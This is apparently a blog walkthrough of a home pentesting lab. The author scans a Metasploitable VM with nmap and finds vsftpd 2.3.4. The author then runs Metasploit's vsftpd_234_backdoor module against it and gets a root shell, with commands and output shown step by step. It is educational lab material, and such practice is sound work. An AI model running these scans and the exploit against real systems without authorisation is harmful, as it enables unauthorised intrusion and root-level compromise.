<h1>Let's hack stuff!</h1>

<p>First and fore most, long time no see. The last couple of months flew by and I haven't really been in the mood of writing. 
Now I stated experimenting with Kali again and figured I might as well document it.</p>

<h2>The environment</h2>

<p>I have set up a Kali VM - the atacker - and a Metasploitable VM - the target - in VirtualBox, that I will be using in this post. 
Kali is a Linux distro designed for hacking/pentesting and is loaded with tools. Metasploitable is an Ubuntu VM loaded with poorly 
configured applications that are easily hackable. I will post installation instructions in a future post, but most of it is dead simple and easily found online already. </p>

<h2>The hack</h2>

<p>This is a very simple exploit and took about ten minutes. The write up took significantly longer!</p>

<h3>Scanning the network</h3>

<p>So after I have fired up my VMs I open the attacking machine and start a terminal. The first thing I want to do is find out where my target is so I 
turn to <code>nmap</code> and run (result edited):</p>

<pre><code># nmap  192.168.56.0/24

Nmap scan report for 192.168.56.103
Host is up (0.00013s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
53/tcp   open  domain
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
5432/tcp open  postgresql
5900/tcp open  vnc
6000/tcp open  X11
6667/tcp open  irc
8009/tcp open  ajp13
8180/tcp open  unknown
</code></pre>

<p>I can identify the target by the loads of open ports. This is a virtual network so there are no other machines on the network, this makes finding
the target easier than it would be in the wild. In a real life scenario you would have to do some research in order to know what machine you should target.</p>

<p>Now that we have our target, <code>192.168.56.103</code> we can do a more advanced scan:</p>

<pre><code># nmap -sV -O -p1-65535 192.168.56.103 &gt; target
</code></pre>

<p>This will scan all the ports (<code>-p1-65535</code>) of particular machine, it will also try to detect the OS (<code>-O</code>) and further more it will try
to identify what versions the software listening to each open port are running (<code>-sV</code>). I save this to a file called <code>target</code> since I like to
reference the scan later on.</p>

<p>In this excercise I am only interested in the fisrt service running on port 21, the second scan returns the following:</p>

<pre><code>21/tcp open  ftp     vsftpd 2.3.4
</code></pre>

<p>We now have a bit more information about our target. We know the application name and version number, this will help us find an exploit.</p>

<h3>Finding an exploit</h3>

<p>There are two things we can do now, either scan the machine with a vulnerability scanner or search for an exploit manually. 
I decided to do a quick manual search and launch a vulnerability scanner if I didn't get quick results. </p>

<p>Metasploit is our friend here so I launch it with <code>#msfconsole</code> and do the following:</p>

<pre><code>msf &gt; search vsftpd

</code></pre>

<p>Jackpot! We found a vulnerability with an excellent rating that affects the exact version our target is running. 
Let's find out more, again the output is edited for brevity.</p>

<pre><code>msf&gt; info exploit/unix/ftp/vsftpd_234_backdoor 

Name: VSFTPD v2.3.4 Backdoor Command Execution
Module: exploit/unix/ftp/vsftpd_234_backdoor
Platform: Unix
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Excellent
Disclosed: 2011-07-03

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.
</code></pre>

<p>This sounds really juicy so I will try it out. First I pick the exploit and show all options for it:</p>

<pre><code>msf &gt; use exploit/unix/ftp/vsftpd_234_backdoor 
msf exploit(vsftpd_234_backdoor) &gt; show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
</code></pre>

<p>This tells me that I need to set the target, denoted by RHOST. I set it and show all available payloads:</p>

<pre><code>msf exploit(vsftpd_234_backdoor) &gt; set RHOST 192.168.56.103
RHOST =&gt; 192.168.56.103
msf exploit(vsftpd_234_backdoor) &gt; show payloads

Compatible Payloads
===================

   Name               Disclosure Date  Rank    Description

   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection
</code></pre>

<p>There is only a single payload available so I select that and launch my attack!</p>

<pre><code>msf exploit(vsftpd_234_backdoor) &gt; set payload cmd/unix/interact 
payload =&gt; cmd/unix/interact
msf exploit(vsftpd_234_backdoor) &gt; exploit

</code></pre>

<p>Succes we have a shell, and as an added bonus:</p>

<pre><code>whoami
root
</code></pre>

<h3>Summary</h3>

<p>This exploit was a very simple challenge and I could execute it with very simple tools. 
Hopefully the next service (SSH running on port 22) will be a little tougher.</p>
